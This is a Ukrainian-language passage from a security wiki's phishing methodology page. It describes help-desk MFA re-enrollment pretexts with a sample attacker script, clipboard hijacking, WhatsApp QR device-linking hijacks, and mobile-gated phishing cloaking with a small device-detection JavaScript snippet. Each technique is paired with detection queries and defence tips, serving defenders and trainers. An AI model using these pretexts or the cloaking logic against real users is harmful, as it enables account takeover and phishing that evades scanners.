Окрім класичного push-bombing, оператори просто **примусово запускають нову MFA-реєстрацію** під час дзвінка до help desk, анулюючи наявний token користувача.  Будь-який наступний login prompt виглядає для жертви легітимним.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Відстежуйте події AzureAD/AWS/Okta, у яких **`deleteMFA` + `addMFA`** відбуваються **протягом кількох хвилин з однієї IP-адреси**.



## Clipboard Hijacking / Pastejacking

Зловмисники можуть непомітно скопіювати шкідливі команди до clipboard жертви зі скомпрометованої або typosquatted вебсторінки, а потім змусити користувача вставити їх у **Win + R**, **Win + X** або вікно термінала, виконавши довільний код без будь-якого завантаження чи вкладення.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Перехоплення прив'язування пристрою WhatsApp через QR social engineering
* Сторінка-приманка (наприклад, фальшивий “канал” міністерства/CERT) показує QR-код WhatsApp Web/Desktop і вказує жертві відсканувати його, непомітно додаючи зловмисника як **linked device**.<sup>[[10]](#references)</sup>
* Зловмисник одразу отримує доступ до перегляду чатів/контактів, доки сесію не буде видалено. Пізніше жертви можуть побачити сповіщення “новий пристрій підключено”; захисники можуть шукати неочікувані події прив'язування пристроїв, що відбулися невдовзі після відвідування ненадійних QR-сторінок.

### Mobile‑gated phishing для обходу crawlers/sandboxes
Оператори дедалі частіше обмежують свої phishing-потоки простою перевіркою пристрою, щоб desktop crawlers ніколи не потрапляли на фінальні сторінки. Поширений підхід полягає в невеликому скрипті, який перевіряє наявність touch-capable DOM і надсилає результат на серверний endpoint; non‑mobile clients отримують HTTP 500 (або порожню сторінку), тоді як mobile users бачать повний потік.<sup>[[6]](#references)</sup>

Мінімальний client snippet (типова логіка):
```html
<script src="/static/detect_device.js"></script>
```
Логіка `detect_device.js` (спрощено):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Часто спостережувана поведінка сервера:
- Встановлює cookie сесії під час першого завантаження.
- Приймає `POST /detect {"is_mobile":true|false}`.
- Повертає 500 (або placeholder) для наступних GET-запитів, коли `is_mobile=false`; показує phishing лише якщо значення `true`.

Евристики пошуку та виявлення:
- Запит urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: послідовність `GET /static/detect_device.js` → `POST /detect` → HTTP 500 для немобільних пристроїв; легітимні шляхи жертв із мобільних пристроїв повертають 200 із подальшим HTML/JS.
- Блокуйте або ретельно перевіряйте сторінки, які визначають вміст виключно за `ontouchstart` або подібними перевірками пристрою.

Поради із захисту:
- Запускайте crawlers із mobile-подібними fingerprint і ввімкненим JS, щоб виявляти gated content.
- Створюйте сповіщення про підозрілі відповіді 500 після `POST /detect` на нещодавно зареєстрованих доменах.

## References

- [1] [Генерація варіантів доменів, що використовуються у phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Пошук phishing: інструменти та методи (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Крадіжка сесій і bypass 2FA за допомогою EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Як встановити та налаштувати DKIM із Postfix на Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [Глобальний звіт Unit 42 про реагування на інциденти за 2025 рік — видання про соціальну інженерію](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing — mobile-gated phishing-інфраструктура та евристики (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Наступний рубіж атак із runtime assembly: використання LLM для генерації phishing JavaScript у реальному часі](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, Click Hijacking і TDS: усередині екосистеми розповсюдження malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Перехоплення трафіку до windows.com від Microsoft за допомогою bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Love? Actually: підроблений dating app використано як приманку в цільовій spyware-кампанії в Пакистані](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [IoC та зразки ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
